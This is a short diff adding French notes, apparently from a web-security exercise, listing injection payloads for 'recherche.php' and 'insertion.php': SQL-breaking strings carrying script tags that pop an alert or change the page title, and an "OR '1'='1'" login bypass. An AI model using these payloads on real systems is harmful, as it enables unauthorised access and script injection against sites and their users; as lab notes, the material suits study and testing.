@@ -1,0 +1,15 @@
+
+
+1) Injection sur recherche.php
+mille%' <script> alert('coucou'); </script> #'
+
+
+Modification du titre:
+mille%'; # <script> document.title='Ha ha!'</script> #'
+
+2) Injection sur instertion.php
+... il faut faire la page insertion.php
+forcage de l'acces à l'insertion
+login: xxx' OR '1'='1'; #'
+passwd: hey
+le reste des données est celle que l'on veut remplir 
